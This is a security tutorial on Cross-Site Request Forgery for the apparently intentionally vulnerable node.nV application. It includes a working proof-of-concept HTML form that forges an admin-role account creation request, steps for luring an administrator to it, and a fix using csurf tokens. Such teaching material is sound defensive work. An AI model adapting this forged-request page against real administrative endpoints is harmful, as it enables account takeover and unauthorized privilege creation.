## Cross Site Request Forgery (CSRF)

#### Description

A Cross-site Request Forgery (CSRF) attack is one in which the user's browser is hijacking in order to submit a request to another website they are authenticated on. They occur as a result of unprotected requests that can change the state without requiring direct user input. For example, if a form/request on a bank website to add money to their bank account is not protected by CSRF, an attacker could create an unrelated page, and submit a request to that endpoint when the user loads the attacker's page. Since the user's browser has a valid session cookie, the request would occur without the user even being aware anything had happened!

CSRF attacks are sometimes thought of as being only applicable to GET requests, but POST requests work just as well. A user simply needs to be manipulated into visiting a malicious website or clicking a malicious link to fall victim to the attack.

#### Problem
POST /api/admin/createUser

In node.nV application, there is no CSRF protection. Attackers could leverage a CSRF attack to exploit administrative functionality.

### Walkthrough
1. Create an HTML page with the code below
2. Host the page created in step one on a private server.
3. Supply the URL to the vulnerable page to an administrator with and active session open.
4. If the admin user presses the button, than the code will execute, and a user with the username:password hacker:hacker will be created.

### Code for step 1 above:

```
  <html>
  <body>
    <form action="http://localhost:8081/api/admin/createUser" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="firstname" value="super" />
      <input type="hidden" name="lastname" value="hacker" />
      <input type="hidden" name="email" value="hacker&#64;hacker&#46;com" />
      <input type="hidden" name="password" value="hacker" />
      <input type="hidden" name="role" value="3" />
      <input type="hidden" name="ispremium" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```


< Note about JSON POST requests and CSRF >


#### Solution

There are several ways to prevent CSRF attacks on your application. The most straightforward method is to use a "synchronizer token" with any request that change state in your application. This involves creating a unique token and attaching it to every HTML form or AJAX call sent to the user. If the user wishes to then make a state-modifying request, they will have to attach the token they were just sent. The server verifies that the token was sent to the user, and only then accepts the request.

There are many node.js packages that have built in middleware features that readily protect against CSRF attacks. csurf is one such package which can be found on npm (https://github.com/expressjs/csurf). The following code can be added to the server.js file in order to activate the csurf module:

```
var csrf = require('csurf')

app.use(csrf({ cookie: true }))

// error handler
app.use(function (err, req, res, next) {
  if (err.code !== 'EBADCSRFTOKEN') return next(err)

  // handle CSRF token errors here
  res.status(403)
  res.send('form tampered with')
})
```
